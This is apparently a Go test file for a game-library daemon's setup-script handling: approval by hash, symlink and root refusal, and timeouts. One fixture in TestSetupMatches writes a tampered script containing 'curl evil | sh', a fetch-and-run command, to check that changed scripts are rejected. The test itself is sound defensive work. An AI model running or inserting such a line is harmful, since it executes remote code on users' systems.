package seat

import (
	"context"
	"errors"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/superuser404notfound/Polyseat/internal/library"
)

// The daemon decides whether to run a folder's setup by looking at the file,
// and a wrong answer either skips a game that would have worked or reports
// "permission denied" out of a log nobody was reading.
func TestRunnable(t *testing.T) {
	dir := t.TempDir()

	if runnable(filepath.Join(dir, folderSetup)) {
		t.Error("a folder with no setup script at all was taken for one with")
	}

	script := filepath.Join(dir, folderSetup)
	if err := os.WriteFile(script, []byte("#!/bin/sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// The bit is the point. A folder that came off a filesystem which does not
	// carry it, or out of a zip, has a script that cannot be run.
	if runnable(script) {
		t.Error("a script without the executable bit was reported runnable")
	}

	if err := os.Chmod(script, 0o755); err != nil {
		t.Fatal(err)
	}

	if !runnable(script) {
		t.Error("an executable script was not reported runnable")
	}

	// A directory of that name carries the executable bit as a matter of
	// course, so IsRegular is what keeps it from being handed to exec.
	asDir := filepath.Join(dir, "sub", folderSetup)
	if err := os.MkdirAll(asDir, 0o755); err != nil {
		t.Fatal(err)
	}

	if runnable(asDir) {
		t.Error("a directory was reported runnable")
	}

	// A link by that name leads wherever its text says on the machine that
	// runs it, which is nothing anybody was shown when they allowed it.
	link := filepath.Join(dir, "linked", folderSetup)
	if err := os.MkdirAll(filepath.Dir(link), 0o755); err != nil {
		t.Fatal(err)
	}

	if err := os.Symlink(script, link); err != nil {
		t.Fatal(err)
	}

	if runnable(link) {
		t.Error("a symlink to a script was reported runnable")
	}
}

// v is a folder version for the tests below.
func v(bytes int64, sec int64) library.Folder {
	return library.Folder{Bytes: bytes, Newest: time.Unix(sec, 0)}
}

// Nothing runs until somebody allows it, and what they allow is one version of
// one folder. A newer copy from any member, which is what a seat that wants to
// run something elsewhere would put in, is a question asked again.
func TestASetupWaitsToBeAllowed(t *testing.T) {
	s, err := openSetups("")
	if err != nil {
		t.Fatal(err)
	}

	if allowed, _ := s.expect("host", "Quake", v(100, 1)); allowed {
		t.Fatal("a script nobody allowed was reported allowed")
	}

	if due, _ := s.due(); len(due) != 0 {
		t.Fatalf("due before anybody allowed anything: %+v", due)
	}

	if got := s.unapproved(); len(got["Quake"]) != 1 {
		t.Errorf("the interface is not asked about it: %v", got)
	}

	if err := s.approve("Quake", "abc", v(100, 1)); err != nil {
		t.Fatal(err)
	}

	due, scripts := s.due()
	if len(due) != 1 || due[0].member != "host" || scripts["Quake"] != "abc" {
		t.Fatalf("an allowed run is not due: %+v %v", due, scripts)
	}

	// The same folder, delivered again in a newer version.
	if allowed, _ := s.expect("host", "Quake", v(100, 2)); allowed {
		t.Error("a newer version was taken as allowed on the strength of the old one")
	}

	if due, _ := s.due(); len(due) != 0 {
		t.Errorf("a newer version is due without being allowed: %+v", due)
	}

	// And a folder that leaves the pool takes its approval with it.
	if err := s.forget("Quake"); err != nil {
		t.Fatal(err)
	}

	if s.isApproved("Quake", "abc", v(100, 1)) {
		t.Error("the approval outlived the folder")
	}
}

// What waits and what is allowed survive a restart. A run waiting for a seat
// that is switched off would otherwise never happen, and the setup is the step
// that makes the game start at all.
func TestSetupsAreKept(t *testing.T) {
	path := filepath.Join(t.TempDir(), setupFile)

	s, err := openSetups(path)
	if err != nil {
		t.Fatal(err)
	}

	if _, err := s.expect("living-room", "Quake", v(100, 1)); err != nil {
		t.Fatal(err)
	}

	if err := s.approve("Quake", "abc", v(100, 1)); err != nil {
		t.Fatal(err)
	}

	again, err := openSetups(path)
	if err != nil {
		t.Fatal(err)
	}

	if due, _ := again.due(); len(due) != 1 || due[0].member != "living-room" {
		t.Errorf("after a restart: %+v", due)
	}

	// A file that cannot be read starts over, which is asking again.
	if err := os.WriteFile(path, []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}

	broken, err := openSetups(path)
	if err == nil {
		t.Error("an unreadable record was not reported")
	}

	if due, _ := broken.due(); len(due) != 0 {
		t.Errorf("an unreadable record allowed something: %+v", due)
	}
}

// The member's copy is hashed immediately before it runs and held to what was
// allowed. A copy that differs, or a link standing in for it, does not run.
func TestSetupMatches(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, folderSetup)

	body := []byte("#!/bin/sh\necho registered\n")
	if err := os.WriteFile(script, body, 0o755); err != nil {
		t.Fatal(err)
	}

	allowed := scriptSum(body)

	if err := setupMatches(script, allowed); err != nil {
		t.Fatalf("the allowed script was refused: %v", err)
	}

	if err := os.WriteFile(script, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	if err := setupMatches(script, allowed); err == nil {
		t.Error("a changed script was taken for the allowed one")
	}

	other := filepath.Join(dir, "real.sh")
	if err := os.WriteFile(other, body, 0o755); err != nil {
		t.Fatal(err)
	}

	if err := os.Remove(script); err != nil {
		t.Fatal(err)
	}

	if err := os.Symlink(other, script); err != nil {
		t.Fatal(err)
	}

	if err := setupMatches(script, allowed); err == nil {
		t.Error("a link to the allowed text was taken for the script")
	}
}

// Allowing names the hash that was shown, and the pool's copy is read again.
// A newer copy that arrived while somebody was reading is not what they read.
func TestApproveFolderSetup(t *testing.T) {
	root := reflinkDirFor(t)

	pool, err := library.Open(filepath.Join(root, "library"))
	if err != nil {
		t.Fatal(err)
	}

	folder := filepath.Join(pool.PoolFolders(), "Quake")
	if err := os.MkdirAll(folder, 0o755); err != nil {
		t.Fatal(err)
	}

	body := []byte("#!/bin/sh\necho registered\n")
	if err := os.WriteFile(filepath.Join(folder, folderSetup), body, 0o755); err != nil {
		t.Fatal(err)
	}

	setups, _ := openSetups("")

	m := &Manager{
		pool:   pool,
		setups: setups,
		log:    slog.New(slog.NewTextHandler(io.Discard, nil)),
	}

	// Marked running so that allowing does not start a worker, which would
	// need a seat store this test does not have.
	setups.running = true

	if err := m.ApproveFolderSetup("Quake", scriptSum([]byte("something else"))); !errors.Is(err, ErrSetupChanged) {
		t.Errorf("allowing by the wrong hash: %v", err)
	}

	version, err := library.FolderAt(pool.PoolFolders(), "Quake")
	if err != nil {
		t.Fatal(err)
	}

	if setups.isApproved("Quake", scriptSum(body), version) {
		t.Fatal("the wrong hash allowed the script")
	}

	if err := m.ApproveFolderSetup("Quake", strings.ToUpper(scriptSum(body))); err != nil {
		t.Fatal(err)
	}

	if !setups.isApproved("Quake", scriptSum(body), version) {
		t.Error("the right hash did not allow the script in the pool's version")
	}
}

// Never as root or a system account, whatever owns the library. The script
// would leave a mark if it ran.
func TestSetupNeverRunsAsRoot(t *testing.T) {
	dir := t.TempDir()
	work := filepath.Join(dir, "Quake")

	if err := os.MkdirAll(work, 0o755); err != nil {
		t.Fatal(err)
	}

	mark := filepath.Join(dir, "ran")
	script := "#!/bin/sh\ntouch " + mark + "\n"

	if err := os.WriteFile(filepath.Join(work, folderSetup), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}

	for _, uid := range []int{0, 1, 999} {
		// The refusal itself, not any error: run as an ordinary user, the
		// attempt to become root would fail on its own and prove nothing.
		if _, err := runSetupOnHost(context.Background(), dir, "Quake", library.Owner{UID: uid, GID: uid}); !errors.Is(err, errSystemOwner) {
			t.Errorf("uid %d was not refused: %v", uid, err)
		}
	}

	if _, err := os.Stat(mark); err == nil {
		t.Error("the script ran")
	}

	// A home that has the directory, so that the answer for root is the uid
	// rule and not the directory being absent.
	home := t.TempDir()
	if err := os.MkdirAll(filepath.Join(home, hostSharedDir), 0o755); err != nil {
		t.Fatal(err)
	}

	if got := foldersFor(0, home); got != "" {
		t.Errorf("a library owned by root takes part in the folders at %q", got)
	}

	if got := foldersFor(minOwnerUID, home); got == "" {
		t.Error("a library owned by a person does not take part")
	}
}

// A deadline that holds. A setup that starts something in the background keeps
// the output pipe open in that grandchild, and exec's own deadline then waits
// for it. Both shapes: a child that stays in the group, which the group kill
// ends, and one that leaves it with setsid, which only WaitDelay gets past.
func TestRunBoundedEndsEverything(t *testing.T) {
	for _, tc := range []struct {
		name, spawn string
	}{
		{"a child in the group", "sleep 60 &"},
		{"a child that left the group", "setsid sleep 60 &"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			pidfile := filepath.Join(dir, "pid")

			script := filepath.Join(dir, folderSetup)
			body := "#!/bin/sh\n" + tc.spawn + "\necho $! > " + pidfile + "\nexec sleep 60\n"

			if err := os.WriteFile(script, []byte(body), 0o755); err != nil {
				t.Fatal(err)
			}

			ctx, cancel := context.WithTimeout(context.Background(), time.Second)
			defer cancel()

			start := time.Now()

			_, err := runBounded(ctx, dir, script, []string{"PATH=" + os.Getenv("PATH")}, nil)
			if err == nil {
				t.Error("a run that was ended reported success")
			}

			if took := time.Since(start); took > 20*time.Second {
				t.Fatalf("the run took %s to end", took)
			}

			raw, err := os.ReadFile(pidfile)
			if err != nil {
				t.Fatal(err)
			}

			pid, err := strconv.Atoi(strings.TrimSpace(string(raw)))
			if err != nil {
				t.Fatal(err)
			}

			// Reaped by init once killed, so give it a moment to go.
			if tc.spawn == "sleep 60 &" {
				gone := false

				for i := 0; i < 50 && !gone; i++ {
					gone = syscall.Kill(pid, 0) != nil
					time.Sleep(20 * time.Millisecond)
				}

				if !gone {
					t.Error("the background child outlived the run")
				}
			} else {
				_ = syscall.Kill(pid, syscall.SIGKILL)
			}
		})
	}
}

// A delivery with a script is written down against the version the pool had,
// whether or not the seat is running and whether or not anybody has allowed it
// yet, so that it runs later rather than never. A later delivery without the
// script takes that back.
func TestDeliveriesAreWrittenDown(t *testing.T) {
	root := reflinkDirFor(t)

	pool, err := library.Open(filepath.Join(root, "library"))
	if err != nil {
		t.Fatal(err)
	}

	body := []byte("#!/bin/sh\necho registered\n")

	for _, dir := range []string{pool.PoolFolders(), pool.SeatFolders("living-room")} {
		if err := os.MkdirAll(filepath.Join(dir, "Quake"), 0o755); err != nil {
			t.Fatal(err)
		}

		if err := os.WriteFile(filepath.Join(dir, "Quake", folderSetup), body, 0o755); err != nil {
			t.Fatal(err)
		}
	}

	setups, _ := openSetups("")

	m := &Manager{
		pool:   pool,
		setups: setups,
		log:    slog.New(slog.NewTextHandler(io.Discard, nil)),
		rt:     map[string]*runtime{},
		subs:   map[int]chan struct{}{},
	}

	members := []library.Member{{Name: "living-room"}}
	report := library.Report{Delivered: []library.Move{{App: "folder:Quake", Name: "Quake", Seat: "living-room"}}}

	m.noteDeliveries(members, report)

	waiting := setups.unapproved()
	if len(waiting["Quake"]) != 1 || waiting["Quake"][0] != "living-room" {
		t.Fatalf("the delivery was not written down: %v", waiting)
	}

	version, err := library.FolderAt(pool.PoolFolders(), "Quake")
	if err != nil {
		t.Fatal(err)
	}

	if err := setups.approve("Quake", scriptSum(body), version); err != nil {
		t.Fatal(err)
	}

	if due, _ := setups.due(); len(due) != 1 {
		t.Fatalf("allowing the pool's version did not make the delivery due: %+v", due)
	}

	// The next version has no script.
	if err := os.Remove(filepath.Join(pool.SeatFolders("living-room"), "Quake", folderSetup)); err != nil {
		t.Fatal(err)
	}

	m.noteDeliveries(members, report)

	if due, _ := setups.due(); len(due) != 0 {
		t.Errorf("a version without a script still has a run waiting: %+v", due)
	}
}

// Only the end of what a script says is kept, which is where the reason is.
func TestTailBuffer(t *testing.T) {
	b := &tailBuffer{limit: 5}

	_, _ = b.Write([]byte("abc"))
	_, _ = b.Write([]byte("defgh"))

	if got := b.String(); got != "defgh" {
		t.Errorf("kept %q", got)
	}
}
